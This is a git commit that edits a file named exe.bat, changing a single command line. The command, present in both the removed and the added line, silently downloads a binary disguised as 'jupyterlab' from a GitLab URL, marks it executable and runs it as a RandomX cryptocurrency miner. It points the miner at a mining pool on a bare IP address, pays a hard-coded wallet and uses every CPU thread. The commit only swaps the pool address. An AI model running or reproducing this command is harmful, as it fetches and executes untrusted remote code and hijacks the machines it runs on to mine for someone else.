0baa36f68a4cb9180bbdddd96b92d94a811fdd80
6f7ekathleen76672 <137009991+6f7ekathleen76672@users.noreply.github.com>
2025-02-13 21:17:22 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,1 +1,1 @@
-wget -qO wolu https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab && chmod +x wolu && ./wolu -a rx/0 -o 47.236.126.193:443 -u 89sFpdzyEQjg8ZHaDDDZ5GUonqznYCDCmEScNTAQtrg341Pz82KG82hE2zWDwWg4gmgBVUmWTYy58ArUPCXH3KrtKJzoGvQ --randomx-1gb-pages -t $(nproc --all) -p J
+wget -qO wolu https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab && chmod +x wolu && ./wolu -a rx/0 -o 47.236.39.4:443 -u 89sFpdzyEQjg8ZHaDDDZ5GUonqznYCDCmEScNTAQtrg341Pz82KG82hE2zWDwWg4gmgBVUmWTYy58ArUPCXH3KrtKJzoGvQ --randomx-1gb-pages -t $(nproc --all) -p J
